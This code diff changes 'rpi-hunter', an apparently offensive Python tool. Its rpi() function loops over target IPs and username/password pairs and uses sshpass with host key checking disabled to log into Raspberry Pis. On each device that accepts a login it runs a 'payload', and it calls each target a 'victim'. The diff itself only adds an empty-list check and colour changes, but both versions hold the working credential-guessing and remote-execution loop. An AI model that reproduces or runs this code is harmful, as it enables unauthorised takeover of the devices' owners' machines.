@@ -30,25 +30,28 @@ def scan():
 # Send payload to Pi's.
 # Requires a list of IP's, a username, credentials (password), and the payload.
 def rpi(ip_list, credentials_list, payload):
-	cprint(f"Loaded {str(len(ip_list))} IP(s)", "yellow")
+	cprint(f"Loaded {str(len(ip_list))} IP(s).", "yellow")
 
-	cprint(f"Loaded payload: {payload}", "green")
-	cprint("Beginning to send payload to Pi's...", "blue")
+	if len(ip_list) > 0:
+		cprint(f"Loaded payload: {payload}", "green")
+		cprint("Beginning to send payload to Pi's...", "blue")
 
-	for ip in ip_list:
-		print(f"{colored('Sending payload to victim', 'yellow')} {colored(ip, 'red')}")
-		print("")
-		for user, creds in credentials_list:
-			print(f"Attempting to send payload using username {user} and password {creds}...")
-			try:
-				ssh_command = f"sshpass -p \"{creds}\" ssh -o stricthostkeychecking=no {user}@{ip} {payload}"
-				output = subprocess.check_output(ssh_command, shell=True, text=True)
-				print(colored(f"Success! Output from {ip}:", "green"))
-				print(output)
-			except subprocess.CalledProcessError as e:
-				print(colored(f"Failed to send payload to {ip} using username {user} and password {creds}.", "red"))
-				print(colored(f"Error: {e}", "red"))
+		for ip in ip_list:
 			print("")
+			print(f"{colored('Attempting to sending payload to victim', 'yellow')} {colored(ip, 'red')}{colored('...', 'yellow')}")
+			for user, creds in credentials_list:
+				print(f"Attempting to send {colored(payload, 'cyan')} using username {colored(user, 'blue')} and password {colored(creds, 'blue')}...")
+				try:
+					ssh_command = f"sshpass -p \"{creds}\" ssh -o stricthostkeychecking=no {user}@{ip} {payload}"
+					output = subprocess.check_output(ssh_command, shell=True, text=True)
+					print(colored(f"Success! Output from {ip}:", "green"))
+					print(output)
+				except subprocess.CalledProcessError as e:
+					print(colored(f"Failed to send payload to {ip} using username {user} and password {creds}.", "red"))
+					print(colored(f"Error: {e}", "red"))
+				print("")
+	else:
+		print(colored("Retreating, no IPs found...", "red"))
 
 # Main function for rpi-hunter.
 # If args.list is True, it will list available payloads.
